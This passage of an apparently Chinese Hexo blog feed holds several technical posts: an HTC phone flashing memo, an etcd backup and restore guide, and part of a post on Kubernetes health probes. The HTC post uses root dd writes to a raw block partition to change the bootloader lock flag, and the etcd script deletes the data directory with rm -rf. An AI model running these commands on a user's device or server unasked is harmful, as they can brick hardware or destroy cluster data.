只进行一次状态获取。</li></ul><h3 id="修复-network-plugin"><a href="#修复-network-plugin" class="headerlink" title="修复 network plugin"></a>修复 network plugin</h3><p>寻找 network plugin hang 住的原因并修复。</p><h3 id="优化监控告警"><a href="#优化监控告警" class="headerlink" title="优化监控告警"></a>优化监控告警</h3><ul><li>pleg latency &gt; 240s for 15min -&gt; error 短信、slack 告知</li><li>pleg latency &gt; 240s -&gt; warning slack 告知</li></ul><h2 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h2><p><a href="https://github.com/kubernetes/kubernetes/issues/45419" target="_blank" rel="noopener">https://github.com/kubernetes/kubernetes/issues/45419</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> K8S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTC 刷机备忘</title>
      <link href="/hexo-blog/20181020/HTC-%E5%88%B7%E6%9C%BA%E5%A4%87%E5%BF%98/"/>
      <url>/hexo-blog/20181020/HTC-%E5%88%B7%E6%9C%BA%E5%A4%87%E5%BF%98/</url>
      
        <content type="html"><![CDATA[<p>笔者对 HTC 手机有着深厚的感情，从 HTC G2 到 HTC M8，经历了 HTC 的鼎盛和衰落。本文记录了一些常用的刷机方法和 hack 命令，以作备忘。</p><h2 id="官方-Unlock-ReLock-方法"><a href="#官方-Unlock-ReLock-方法" class="headerlink" title="官方 Unlock/ReLock 方法"></a>官方 Unlock/ReLock 方法</h2><h3 id="Unlock"><a href="#Unlock" class="headerlink" title="Unlock"></a>Unlock</h3><h4 id="获取解锁-token"><a href="#获取解锁-token" class="headerlink" title="获取解锁 token"></a>获取解锁 token</h4><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot oem get_identifier_token</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt; Identifier Token Start &gt;&gt;&gt;&gt;</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">&lt;&lt;&lt;&lt;&lt; Identifier Token End &gt;&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="获取解锁码"><a href="#获取解锁码" class="headerlink" title="获取解锁码"></a>获取解锁码</h4><p>前往 <a href="http://www.htcdev.com/bootloader" target="_blank" rel="noopener">http://www.htcdev.com/bootloader</a> 获取官方解锁码。</p><h4 id="刷入解锁码"><a href="#刷入解锁码" class="headerlink" title="刷入解锁码"></a>刷入解锁码</h4><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash unlocktoken Unlock_code.bin</span><br></pre></td></tr></table></figure><h3 id="Relock"><a href="#Relock" class="headerlink" title="Relock"></a>Relock</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot oem lock</span><br></pre></td></tr></table></figure><h2 id="刷入-Recovery-方法"><a href="#刷入-Recovery-方法" class="headerlink" title="刷入 Recovery 方法"></a>刷入 Recovery 方法</h2><h3 id="常规方法"><a href="#常规方法" class="headerlink" title="常规方法"></a>常规方法</h3><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot flash recovery recovery.img</span><br></pre></td></tr></table></figure><p>重启后进入 recovery 界面</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastboot reboot</span><br><span class="line">adb reboot recovery</span><br></pre></td></tr></table></figure><p>或者可以在 fastboot 界面直接进入 recovery</p><h3 id="在-S-OFF-LOCKED-状态下刷入第三方-Recovery-的方法"><a href="#在-S-OFF-LOCKED-状态下刷入第三方-Recovery-的方法" class="headerlink" title="在 S-OFF + LOCKED 状态下刷入第三方 Recovery 的方法"></a>在 S-OFF + LOCKED 状态下刷入第三方 Recovery 的方法</h3><h4 id="准备-ZIP-文件"><a href="#准备-ZIP-文件" class="headerlink" title="准备 ZIP 文件"></a>准备 ZIP 文件</h4><p>在 S-OFF + LOCKED 情况下通过 adb 工具线刷时，所用的 <code>recovery.zip</code> 包里必须包括 <code>android-info.txt</code> 和 <code>recovery.img</code>。而这个 <code>android-info.txt</code> 的内容必须符合你的手机信息，以我的 Sprint 版为例，其内容是：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">modelid: PN0720000</span><br><span class="line">cidnum: 11111111</span><br><span class="line">mainver: 5.03.651.3</span><br><span class="line">btype:1</span><br><span class="line">aareport:1</span><br><span class="line">DelCache:1</span><br><span class="line">hbootpreupdate:3</span><br></pre></td></tr></table></figure><p>查询以上信息的方法为：在 adb 中输入 <code>fastboot getvar all</code> 即可看到，然后将所需的 <code>modelid</code>、<code>cidnum</code>、<code>mainver</code> 信息修改到 <code>android-info.txt</code> 文件中。</p><p><code>android-info.txt</code> 文件可以从官方 RUU 中提取，然后把上面查询到的信息替换到里面即可。</p><p>最后将 <code>recovery.img</code> 和 <code>android-info.txt</code> 一起打包到 zip 压缩包中，并放入 adb 工具的文件夹里即可开始下面步骤了。</p><p>（刷 radio 也是同理，必须在 zip 压缩包中加入 <code>android-info.txt</code>。）</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot oem rebootRUU</span><br><span class="line">fastboot flash zip recovery.zip</span><br></pre></td></tr></table></figure><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure><h2 id="BootLoader-状态随意修改（需要-S-OFF）"><a href="#BootLoader-状态随意修改（需要-S-OFF）" class="headerlink" title="BootLoader 状态随意修改（需要 S-OFF）"></a>BootLoader 状态随意修改（需要 S-OFF）</h2><h3 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h3><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="hljs-keyword">if</span>=/dev/block/mmcblk0p3 bs=1 skip=33796 count=4</span><br></pre></td></tr></table></figure><h3 id="LOCK"><a href="#LOCK" class="headerlink" title="LOCK"></a>LOCK</h3><p>to LOCK your bootloader,enter the following:</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">su (<span class="hljs-keyword">if</span> needed to get a <span class="hljs-comment"># prompt)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># (i would very strongly recomend you copy/paste this)</span></span><br><span class="line"><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">'\x00\x00\x00\x00'</span> | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># (exit a second time if you need to to get back to a normal &gt; prompt)</span></span><br><span class="line"><span class="hljs-built_in">exit</span></span><br><span class="line"></span><br><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure><p>verify you are now locked</p><h3 id="UNLOCK"><a href="#UNLOCK" class="headerlink" title="UNLOCK"></a>UNLOCK</h3><p>to UNLOCK your bootloader,enter the following:</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">su (<span class="hljs-keyword">if</span> needed to get a <span class="hljs-comment"># prompt)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># (i would very strongly recomend you copy/paste this)</span></span><br><span class="line"><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"HTCU"</span> | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># (exit a second time if you need to to get back to a normal &gt; prompt)</span></span><br><span class="line"><span class="hljs-built_in">exit</span></span><br><span class="line"></span><br><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure><p>verify you are now unlocked</p><h3 id="RELOCK"><a href="#RELOCK" class="headerlink" title="RELOCK"></a>RELOCK</h3><p>to RELOCK your bootloader,enter the following:</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">su (<span class="hljs-keyword">if</span> needed to get a <span class="hljs-comment"># prompt)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># (i would very strongly recomend you copy/paste this)</span></span><br><span class="line"><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"HTCL"</span> | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># (exit a second time if you need to to get back to a normal &gt; prompt)</span></span><br><span class="line"><span class="hljs-built_in">exit</span></span><br><span class="line"></span><br><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure><p>verify you are now relocked</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://bbs.gfan.com/android-7235658-1-1.html" target="_blank" rel="noopener">http://bbs.gfan.com/android-7235658-1-1.html</a></p><p><a href="https://androidforums.com/threads/how-to-lock-unlock-your-bootloader-without-htcdev-s-off-required.916138/" target="_blank" rel="noopener">https://androidforums.com/threads/how-to-lock-unlock-your-bootloader-without-htcdev-s-off-required.916138/</a></p><h2 id="HTC-测试指令"><a href="#HTC-测试指令" class="headerlink" title="HTC 测试指令"></a>HTC 测试指令</h2><p>测试指令：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*#*#3424#*#*</span><br></pre></td></tr></table></figure><p>工程模式</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*#*#4636#*#*</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> HTC </tag>
            
            <tag> 刷机 </tag>
            
            <tag> Android </tag>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>etcd 集群的备份和还原</title>
      <link href="/hexo-blog/20180725/etcd-%E9%9B%86%E7%BE%A4%E7%9A%84%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/"/>
      <url>/hexo-blog/20180725/etcd-%E9%9B%86%E7%BE%A4%E7%9A%84%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>安装 etcdctl</p><p><strong>方法1</strong></p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install etcd-client=3.2.17+dfsg-1</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>方法2</strong></p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> RELEASE=<span class="hljs-string">"3.2.17"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">test</span> -d /tmp/etcd &amp;&amp; mkdir -p /tmp/etcd &amp;&amp; <span class="hljs-built_in">cd</span> /tmp/etcd</span><br><span class="line">wget https://github.com/etcd-io/etcd/releases/download/v<span class="hljs-variable">$&#123;RELEASE&#125;</span>/etcd-v<span class="hljs-variable">$&#123;RELEASE&#125;</span>-linux-amd64.tar.gz</span><br><span class="line">tar -zxvf etcd-v<span class="hljs-variable">$&#123;RELEASE&#125;</span>-linux-amd64.tar.gz</span><br><span class="line"><span class="hljs-built_in">cd</span> etcd-v<span class="hljs-variable">$&#123;RELEASE&#125;</span>-linux-amd64</span><br><span class="line">cp etcdctl /usr/<span class="hljs-built_in">local</span>/bin</span><br><span class="line"></span><br><span class="line">etcdctl --version</span><br></pre></td></tr></table></figure><p><strong>方法3</strong></p><p>使用 docker cp 从 etcd 容器中拷贝。</p><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>etcd 的备份有两种方式，选择其一即可。</p><h3 id="方式一：使用-etcdctl-snapshot-命令（推荐）"><a href="#方式一：使用-etcdctl-snapshot-命令（推荐）" class="headerlink" title="方式一：使用 etcdctl snapshot 命令（推荐）"></a>方式一：使用 etcdctl snapshot 命令（推荐）</h3><p>在任何一个 member 节点执行：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ETCDCTL_API=3 etcdctl snapshot save snapshot.db</span><br></pre></td></tr></table></figure><h3 id="方式二：拷贝-member-snap-db-文件"><a href="#方式二：拷贝-member-snap-db-文件" class="headerlink" title="方式二：拷贝 member/snap/db 文件"></a>方式二：拷贝 member/snap/db 文件</h3><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /var/lib/etcd/member/snap/db snapshot.db</span><br></pre></td></tr></table></figure><p>如果使用此方法，etcdctl snapshot restore 时需要设置 <code>--skip-hash-check=true</code></p><h2 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h2><h3 id="方式一：单节点还原成功后，再将其他节点加入集群"><a href="#方式一：单节点还原成功后，再将其他节点加入集群" class="headerlink" title="方式一：单节点还原成功后，再将其他节点加入集群"></a>方式一：单节点还原成功后，再将其他节点加入集群</h3><p>根据 snapshot.db 生成新的 data dir：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># restore.sh</span></span><br><span class="line"></span><br><span class="line">rm /var/lib/etcd -rf </span><br><span class="line"> </span><br><span class="line">ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \</span><br><span class="line">  --name k8s-etcd-host1 \</span><br><span class="line">  --data-dir /var/lib/etcd \</span><br><span class="line">  --initial-cluster k8s-etcd-host1=http://host1:2380 \</span><br><span class="line">  --initial-cluster-token k8s-etcd \</span><br><span class="line">  --initial-advertise-peer-urls http://host1:2380 \</span><br><span class="line">  --skip-hash-check=<span class="hljs-literal">false</span></span><br></pre></td></tr></table></figure><p>启动单实例：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">spec:</span></span><br><span class="line"><span class="hljs-attr">  containers:</span></span><br><span class="line"><span class="hljs-attr">  - command:</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-string">etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--name=k8s-etcd-host1</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-advertise-peer-urls=http://host1:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--listen-peer-urls=http://host1:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--listen-client-urls=http://0.0.0.0:2379</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--advertise-client-urls=http://host1:2379</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--data-dir=/var/lib/etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster-token=k8s-etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster=k8s-etcd-host1=http://host1:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster-state=existing</span></span><br></pre></td></tr></table></figure><p>将其他节点依次加入集群（先执行 add 命令再启动实例），add 命令如下：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">etcdctl member add k8s-etcd-host2 http://host2:2380</span><br></pre></td></tr></table></figure><p>启动实例：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">spec:</span></span><br><span class="line"><span class="hljs-attr">  containers:</span></span><br><span class="line"><span class="hljs-attr">  - command:</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-string">etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--name=k8s-etcd-host2</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-advertise-peer-urls=http://host2:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--listen-peer-urls=http://host2:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--listen-client-urls=http://0.0.0.0:2379</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--advertise-client-urls=http://host2:2379</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--data-dir=/var/lib/etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster-token=k8s-etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster=k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster-state=existing</span></span><br></pre></td></tr></table></figure><p>其他实例操作方法类似。</p><h3 id="方式二：同时还原多节点集群"><a href="#方式二：同时还原多节点集群" class="headerlink" title="方式二：同时还原多节点集群"></a>方式二：同时还原多节点集群</h3><p>将 snapshot.db 文件拷贝至所有 etcd 节点，根据 snapshot.db 生成 data dir：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \</span><br><span class="line">  --name k8s-etcd-host1 \</span><br><span class="line">  --data-dir /var/lib/etcd \</span><br><span class="line">  --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \</span><br><span class="line">  --initial-cluster-token k8s-etcd \</span><br><span class="line">  --initial-advertise-peer-urls http://host1:2380 \</span><br><span class="line">  --skip-hash-check=<span class="hljs-literal">false</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \</span><br><span class="line">  --name k8s-etcd-host2 \</span><br><span class="line">  --data-dir /var/lib/etcd \</span><br><span class="line">  --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \</span><br><span class="line">  --initial-cluster-token k8s-etcd \</span><br><span class="line">  --initial-advertise-peer-urls http://host2:2380 \</span><br><span class="line">  --skip-hash-check=<span class="hljs-literal">false</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \</span><br><span class="line">  --name k8s-etcd-host3 \</span><br><span class="line">  --data-dir /var/lib/etcd \</span><br><span class="line">  --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \</span><br><span class="line">  --initial-cluster-token k8s-etcd \</span><br><span class="line">  --initial-advertise-peer-urls http://host3:2380 \</span><br><span class="line">  --skip-hash-check=<span class="hljs-literal">false</span></span><br></pre></td></tr></table></figure><p>还原后启动所有 etcd 实例 。启动参数如下，其他类似：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">spec:</span></span><br><span class="line"><span class="hljs-attr">  containers:</span></span><br><span class="line"><span class="hljs-attr">  - command:</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-string">etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--name=k8s-etcd-host1</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-advertise-peer-urls=http://host1:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--listen-peer-urls=http://host1:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--listen-client-urls=http://0.0.0.0:2379</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--advertise-client-urls=http://host1:2379</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--data-dir=/var/lib/etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster-token=k8s-etcd</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster=k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380</span></span><br><span class="line"><span class="hljs-bullet">    -</span> <span class="hljs-bullet">--initial-cluster-state=existing</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p>启动 etcd 之前最好停掉 kube-apiserver</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://coreos.com/etcd/docs/3.1.12/op-guide/recovery.html" target="_blank" rel="noopener">https://coreos.com/etcd/docs/3.1.12/op-guide/recovery.html</a></li><li><a href="https://coreos.com/etcd/docs/latest/op-guide/runtime-configuration.html" target="_blank" rel="noopener">https://coreos.com/etcd/docs/latest/op-guide/runtime-configuration.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> K8S </tag>
            
            <tag> etcd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes 容器生命周期管理</title>
      <link href="/hexo-blog/20180404/Kubernetes-%E5%AE%B9%E5%99%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/"/>
      <url>/hexo-blog/20180404/Kubernetes-%E5%AE%B9%E5%99%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="健康检查和就绪检查"><a href="#健康检查和就绪检查" class="headerlink" title="健康检查和就绪检查"></a>健康检查和就绪检查</h2><h3 id="健康检查（Liveness-Probe）"><a href="#健康检查（Liveness-Probe）" class="headerlink" title="健康检查（Liveness Probe）"></a>健康检查（Liveness Probe）</h3><p>如果设置了 <code>livenessProbe</code>，k8s (kubelet) 会每隔 n 秒执行预先配置的行为来检查容器是否健康</p><p>当健康检查失败时，k8s 会认为容器已经挂掉，会根据 <code>restartPolicy</code> 来对容器进行重启或其他操作。</p><p>每次检查有 3 种结果，<code>Success</code>、<code>Failure</code>、<code>Unknown</code></p><p>如果不配置，默认的检查状态为 <code>Success</code></p><a id="more"></a><p><strong>什么时候不需要健康检查</strong>：如果服务在异常后会自动退出或 crash，就不必配置健康检查，k8s 会按照重启策略来自动操作。</p><p><strong>什么时候需要健康检查</strong>：相反，如果服务异常必须由 k8s 主动介入来重启容器，就需要配置健康检查</p><h3 id="就绪检查（Readiness-Probe）"><a href="#就绪检查（Readiness-Probe）" class="headerlink" title="就绪检查（Readiness Probe）"></a>就绪检查（Readiness Probe）</h3><p>如果设置了 <code>readinessProbe</code>，k8s (kubelet) 会每隔 n 秒检查容器对外提供的服务是否正常</p><p>当就绪检查失败时，k8s 会将 Pod 标记为 <code>Unready</code>，将 Pod IP 从 endpoints 中剔除，即不会让之后的流量通过 service 发送过来。</p><p>在首次检查之前，初始状态为 <code>Failure</code></p><p>如果不配置，默认的状态为 <code>Success</code></p><p><strong>什么时候需要就绪检查</strong>：如果在服务启动后、初始化完成之前不想让流量过来，就需要配置就绪检查。</p><p><strong>什么时候不需要就绪检查</strong>：除了上述场景，在 Pod 被删除时，k8s 会主动将 Pod 置为 <code>UnReady</code> 状态，之后的流量也不会过来，因此针对这种情况不必配置就绪检查。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>健康／就绪检查支持以下参数：</p><ul><li><code>initialDelaySeconds</code>: 容器启动后，进行首次检查的等待时间（秒）</li><li><code>periodSeconds</code>: 每次检查的间隔时间（秒）</li><li><code>timeoutSeconds</code>: 执行检查的超时时间（秒），默认值为 1，最小值是 1</li><li><code>successThreshold</code>: 检查失败时，连续成功 n 次后，认为该容器的健康／就绪检查成功。默认值为 1，最小值是 1，对于健康检查必须为 1</li><li><code>failureThreshold</code>: 连续失败 n 次后，认为该容器的健康／就绪检查失败。默认值为 3，最小值是 1</li></ul><h3 